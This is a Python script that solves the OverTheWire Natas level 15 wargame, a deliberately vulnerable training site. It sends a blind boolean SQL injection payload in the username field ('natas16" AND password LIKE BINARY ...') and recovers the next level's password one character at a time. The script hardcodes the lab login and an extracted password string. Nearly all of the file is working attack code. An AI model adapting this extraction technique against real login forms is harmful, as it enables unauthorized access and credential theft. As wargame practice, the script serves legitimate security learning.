import requests
import re

def bruteforce_password(url, username, password):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    # Filters chars to narrow the search range
    filtered = ''
    print ('Filtering characters: ', end = '', flush = True)
    for c in characters:
        data = { 'username' : f'natas16" AND password LIKE BINARY "%{c}%" #'}
        response = requests.post(url, auth = (username, password), data = data)
        content = response.text
        
        if 'exists' in content:
            print(c, end = '', flush = True)
            filtered += c
    
    print()
    validpass = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
    for i in range(32-len(validpass)):
        for c in filtered:
            print(f'Trying password: {validpass + c}', end = '\r')
            data = { 'username' : f'natas16" AND password LIKE BINARY "{validpass + c}%" #'}
            response = requests.post(url, auth = (username, password), data = data)
            content = response.text

            if 'exists' in content:
                validpass += c
                break
    
    print('\nThe password was found!')
    return validpass

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = f'http://{username}.natas.labs.overthewire.org'

print(bruteforce_password(url, username, password))